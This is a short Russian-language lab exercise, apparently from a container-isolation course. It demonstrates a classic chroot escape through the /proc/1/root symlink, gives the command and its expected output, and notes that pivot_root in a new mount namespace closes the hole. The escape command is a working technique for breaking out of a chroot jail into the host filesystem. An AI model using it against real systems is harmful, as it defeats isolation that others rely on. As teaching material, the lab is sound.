# 03 — Сбежать из chroot через /proc/1/root

## Задача
Выполнить классический «chroot escape»: имея root внутри `chroot` и
примонтированный `/proc`, выйти в корень хоста через magic-symlink
`/proc/1/root`. Это доказывает, что `chroot` — НЕ граница безопасности.

## Проверка
```bash
sudo chroot /lab/01-chroot/rootfs /bin/sh -c '
  echo "я внутри chroot, мой /etc/hostname: $(cat /etc/hostname)"
  # /proc/1/root указывает на корень PID 1 = корень ХОСТА (mnt-ns общий)
  chroot /proc/1/root /bin/sh -c "echo сбежал; hostname; head -1 /etc/os-release"
'
```

## Ожидаемый результат
```
я внутри chroot, мой /etc/hostname: chroot-jail
сбежал
DESKTOP-2NEPKQQ                         <- hostname ХОСТА (имя у вас своё)
PRETTY_NAME="Ubuntu ..."                <- читаем хостовый /etc/os-release
```
Один `chroot(2)` из «тюрьмы» — и мы в корне хоста. Защита приходит на этапе
`03-pivot-root`: после `pivot_root` в новом mount-namespace ссылка
`/proc/1/root` ведёт уже в новый корень, и побег закрывается.
